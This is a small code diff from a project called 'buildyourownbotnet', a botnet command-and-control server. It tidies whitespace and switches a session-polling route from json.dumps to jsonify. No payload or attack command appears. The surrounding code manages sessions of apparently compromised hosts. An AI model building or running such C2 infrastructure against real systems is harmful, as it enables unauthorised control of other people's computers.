@@ -5,10 +5,8 @@ from buildyourownbotnet import c2
 from buildyourownbotnet.core.dao import session_dao, task_dao
 from buildyourownbotnet.models import db, Session
 
-
 # Blueprint
 session = Blueprint('session', __name__)
-
 
 @session.route("/api/session/new", methods=["POST"])
 def session_new():
@@ -85,4 +83,4 @@ def session_poll():
 		new_sessions.append(s.serialize())
 		s.new = False
 		db.session.commit()
-	return json.dumps(new_sessions)
+	return jsonify(new_sessions)
